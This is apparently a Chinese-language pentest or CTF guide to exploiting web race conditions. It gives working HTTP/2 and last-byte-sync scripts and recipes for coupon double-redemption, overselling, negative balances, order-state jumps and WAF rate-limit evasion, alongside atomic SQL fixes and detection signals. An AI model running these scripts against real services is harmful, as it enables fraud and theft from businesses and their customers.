# 竞态与状态漂移：单包多请求、TOCTOU、可稳定复现的构造

> 被 `competition-race-condition-state-drift` 引用。竞态的价值在于**绕过一个本该串行化的
> 校验**。目标不是"偶尔能成功"，而是"打 10 次成功 8 次"。

## 一、先判清是哪种竞态

| 类型 | 机制 | 典型目标 |
| --- | --- | --- |
| **TOCTOU**（检查与使用间） | 先查余额再扣款，中间有窗口 | 余额/库存/限额 |
| **双重提交** | 同一请求发两次，两次都通过"是否已存在" | 重复注册/重复领券 |
| **限额绕过** | 并发多请求，各自读到旧计数 | 优惠券/邀请奖励/试用期 |
| **状态机跳跃** | 并发触发两个状态转换，覆盖前一个 | 订单状态/审批流 |
| **条件竞争写** | 两请求同时写同一行，后者覆盖前者 | 改他人资料 |
| **限流绕过** | 并发打穿滑动窗口 | 登录/OTP |

## 二、单包多请求：技术核心

### 2.1 HTTP/2 单连接并发（最有效）

HTTP/1.1 单连接是串行的（除 pipelining，且多数服务器不支持）。**HTTP/2 的多路复用让
多个请求在同一条 TCP 连接上真正并发**，且到达服务端的时间差在微秒级。

```bash
# 用 h2load 打并发（测吞吐）不适合；要精确控制，用 nghttp 或 Python httpx
```

```python
#!/usr/bin/env python3
"""race_h2.py — HTTP/2 单连接并发打同一个请求"""
import asyncio, httpx, sys, time

URL = sys.argv[1]
N = int(sys.argv[2]) if len(sys.argv) > 2 else 20
BODY = sys.argv[3] if len(sys.argv) > 3 else None
HDRS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False, timeout=20) as c:
        # 预热连接
        await c.get(URL)
        t0 = time.perf_counter()
        reqs = [c.post(URL, content=BODY, headers=HDRS) for _ in range(N)]
        res = await asyncio.gather(*reqs, return_exceptions=True)
        dt = time.perf_counter() - t0
        for i, r in enumerate(res):
            if isinstance(r, Exception):
                print(i, 'ERR', r)
            else:
                print(i, r.status_code, r.text[:120].replace('\n',' '))
        print(f'--- {N} reqs in {dt*1000:.1f} ms')

asyncio.run(main())
```

```bash
pip install httpx h2
python3 race_h2.py 'https://target/api/coupon/redeem' 20 '{"code":"SAVE50"}'
```

**关键**：用 `asyncio.gather` 让所有请求同时发出，而不是 `for` 循环里 `await`。

### 2.2 HTTP/1.1 单包多请求（last-byte sync）

经典技术（James Kettle，2022）：把 N 个请求拼在一个 TCP 包里，**只保留每个请求的最后
一个字节不发**，等所有请求都就绪后，一次发出最后字节。

```python
#!/usr/bin/env python3
"""race_lastbyte.py — 单包多请求（last-byte synchronization）"""
import socket, ssl, time, sys

HOST, PORT = 'target.example.com', 443
PATH = '/api/coupon/redeem'
BODY = '{"code":"SAVE50"}'
N = 20

def build():
    req = (
        f'POST {PATH} HTTP/1.1\r\n'
        f'Host: {HOST}\r\n'
        f'Authorization: Bearer TOKEN\r\n'
        f'Content-Type: application/json\r\n'
        f'Content-Length: {len(BODY)}\r\n'
        f'Connection: keep-alive\r\n\r\n'
        f'{BODY}'
    ).encode()
    return req

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname=HOST)

req = build()
# 先发前 N-1 个完整请求 + 第 N 个的除最后字节外的部分
payload = b''
for i in range(N):
    payload += req
# 只保留最后一个字节
head, last = payload[:-1], payload[-1:]

s.sendall(head)
time.sleep(0.05)          # 让服务端收到并挂起（等最后字节）
t0 = time.perf_counter()
s.sendall(last)           # 一次发出，所有请求同时完成
print('sent last byte in one packet')

buf = b''
s.settimeout(5)
try:
    while True:
        d = s.recv(65536)
        if not d: break
        buf += d
except socket.timeout:
    pass
print(buf.decode('latin1')[:3000])
```

**为什么有效**：TCP 的 Nagle + 内核缓冲让"最后一个字节"成为所有请求的"释放开关"。服务端
在极短时间内收到 N 个完整请求，进入并发处理。

### 2.3 Burp 的 Turbo Intruder（最实用）

```python
# Turbo Intruder 脚本：单包多请求
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)          # BURP2 = HTTP/2
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')       # 所有请求同时放行

def handleResponse(req, interesting):
    table.add(req)
```

**`gate` 机制**是 Turbo Intruder 的核心：所有请求先准备好，`openGate` 一次性释放。

## 三、TOCTOU：三个经典场景

### 3.1 余额/库存

```bash
# 场景：账户有 100 元，商品 60 元。并发 10 个下单请求
# 期望：只有 1 个成功（余额不足）；实际：可能多个成功 → 负数余额
python3 race_h2.py 'https://target/api/order' 10 '{"sku":"A","qty":1}'

# 验伤：查余额是否为负，或库存是否为负
curl -s https://target/api/me/balance | jq .
curl -s https://target/api/products/A | jq .stock
```

### 3.2 优惠券/邀请奖励

```bash
# 同一券码并发兑换
python3 race_h2.py 'https://target/api/coupon/redeem' 50 '{"code":"ONCE-ONLY"}'
# 数一下有多少 200
```

### 3.3 注册/唯一性

```bash
# 同一 email 并发注册
python3 race_h2.py 'https://target/api/register' 20 '{"email":"a@b.com","password":"x"}'
# 若创建了多条记录 → 唯一约束在应用层而非 DB
```

## 四、数据库隔离级别的放大作用

| 隔离级别 | 竞态表现 |
| --- | --- |
| READ UNCOMMITTED | 能读到未提交数据 → 幻读/脏读 |
| READ COMMITTED（Pg 默认） | 并发写会阻塞（行锁），但"先读后写"仍有窗口 |
| REPEATABLE READ（MySQL 默认） | 快照读，写冲突时可能死锁或覆盖 |
| SERIALIZABLE | 理论上无竞态（但性能差，少用） |

**关键**：`SELECT ... FOR UPDATE` 能消除 TOCTOU；`UPDATE x SET n=n-1 WHERE n>0` 是原子的
（单语句）。漏洞来自"先 SELECT 判断，再 UPDATE"的分步逻辑。

```sql
-- 有漏洞的写法（两步，中间有窗口）
SELECT stock FROM products WHERE id='A';        -- 读到 1
-- 窗口：另一个请求也读到 1
UPDATE products SET stock = 0 WHERE id='A';     -- 两个都执行，最终 0 但卖了 2 件

-- 安全写法（原子）
UPDATE products SET stock = stock - 1 WHERE id='A' AND stock >= 1;
-- 影响行数 0 表示失败
```

```bash
# 判断是否用了原子更新：并发后看最终值
# 若 stock 变成负数 → 没有约束
# 若 stock 是 0 但订单数 > 初始库存 → 有超卖
curl -s https://target/api/products/A | jq '{stock}'
curl -s https://target/api/admin/orders?sku=A | jq '.total'
```

## 五、可稳定复现的五个要素

| 要素 | 做法 |
| --- | --- |
| **并发数** | 先试 10，不够加到 50-100（服务端 worker 数决定上限） |
| **连接复用** | HTTP/2 单连接；HTTP/1.1 用 last-byte sync |
| **预热** | 先发一个请求建立连接/会话/缓存，避免首请求慢 |
| **去噪** | 关闭其他流量；用独立测试账号；确认目标无其他负载 |
| **重复次数** | 至少 10 轮，统计成功率（80% 以上算稳定） |

```bash
# 统计成功率的脚本
for round in $(seq 1 10); do
  python3 race_h2.py 'https://target/api/coupon/redeem' 20 '{"code":"X"}' 2>/dev/null \
    | grep -c '^.* 200 '
done
# 输出：每轮 200 的数量。若某些轮是 2-3，某些是 1 → 不稳定，要加并发
```

**稳定性判据**：

- 单轮出现 >1 个成功 → 竞态存在
- 10 轮里 ≥8 轮出现 >1 个成功 → **稳定复现**
- 只是偶尔出现 → 加并发/减延迟/换入口（不同端点可能有不同的锁粒度）

## 六、状态漂移：不只是"多卖一件"

| 漂移 | 构造 | 效果 |
| --- | --- | --- |
| 订单状态跳跃 | 并发 `pay` + `cancel` | 订单既已支付又已取消，退款可重复 |
| 审批流绕过 | 并发提交"通过"与"驳回" | 最终状态由后写者决定 |
| 账号绑定 | 并发绑定两个手机号 | 两个都绑上，或后一个覆盖前一个 |
| 余额转移 | 并发转账给自己 | 金额翻倍 |
| 文件写竞争 | 并发上传同名文件 | 内容混合/覆盖 |
| 缓存与 DB 不一致 | 并发更新 + 读缓存 | 缓存里是旧值（可反复利用） |

```bash
# 状态跳跃测试
python3 race_h2.py 'https://target/api/order/123/pay' 10 '{}'
python3 race_h2.py 'https://target/api/order/123/cancel' 10 '{}' &
# 同时发起，最后查状态
curl -s https://target/api/order/123 | jq '{status, paid_at, cancelled_at}'
```

## 七、验伤：竞态的成功标准

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 超卖 | 订单总数 > 初始库存；库存为负 | 只是有多个 200 响应（可能都失败在 DB 层） |
| 重复兑换 | 同一券码被用 N 次（DB 里有 N 条记录） | 多个 200 但只有 1 条记录 |
| 余额为负 | `balance < 0` 且能查到一个负数订单 | 余额没变（请求被拒） |
| 重复注册 | 同一 email 有 2 条用户记录 | 只是返回了 200 + 同一个用户 |
| 限额绕过 | 实际发放数量 > 限额 | 并发请求都返回"已领取" |

**最重要的验伤动作**：**查数据库/查状态的最终值**，不要只看 HTTP 状态码。

```bash
# 完整验伤
# 1) 并发打
python3 race_h2.py 'https://target/api/coupon/redeem' 30 '{"code":"X"}' > race.log
# 2) 数 200
grep -c ' 200 ' race.log
# 3) 查实际发放
curl -s https://target/api/me/coupons | jq '.items | length'
# 若 200 数量 = 1 但 coupons 有 3 张 → 也是竞态（响应与落库不一致）
```

## 八、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 并发同请求 | 应用日志 | 同一用户同一端点在 <100ms 内多次请求；`X-Request-Id` 密集 |
| 单包多请求 | 网关/WAF | 单 TCP 连接内 N 个请求几乎同时到达（时间戳差 <1ms） |
| 超卖 | DB 审计 | 库存为负；同一 SKU 的订单数超过库存变动记录 |
| 重复兑换 | 应用审计 | 同一券码多行核销记录 |
| 状态跳跃 | 状态机日志 | 同一订单的状态变更时间戳重叠（两个变更同一毫秒） |
| 限额绕过 | 业务指标 | 发放量 > 限额；计数与明细不一致 |

**关键检测点**：**同一主体在极短时间窗口内的并发度**。多数 WAF 只按请求数限流，不按并发度。

## 九、常见坑

1. **用 `for` 循环 + `curl &` 就以为并发**——shell 启动进程有开销，请求间隔可能几十毫秒。必须用 HTTP/2 单连接或 last-byte sync。
2. **每次请求新建连接**——TCP/TLS 握手让时间差变大，竞态窗口关闭。必须复用连接。
3. **并发数不够**——服务端有 4 个 worker，你发 5 个请求，只有 1 个能撞上。要发到 worker 数的 5-10 倍。
4. **忘了预热**——首请求要建立会话/加载缓存，比其他请求慢，导致不并发。先发一个。
5. **只看状态码**——多个 200 不代表成功（可能都返回 `{"ok":false}`）。必须查最终状态。
6. **限流把请求拦了**——并发 100 会触发 WAF。先测限流阈值，或用不同账号分散。
7. **HTTP/2 被服务端降级**——某些代理不支持 H2 到后端，并发失效。用 last-byte sync 作为备选。
8. **测试污染生产数据**——竞态会产生真实的重复订单/多发券。必须用测试账号 + 事先约定清理。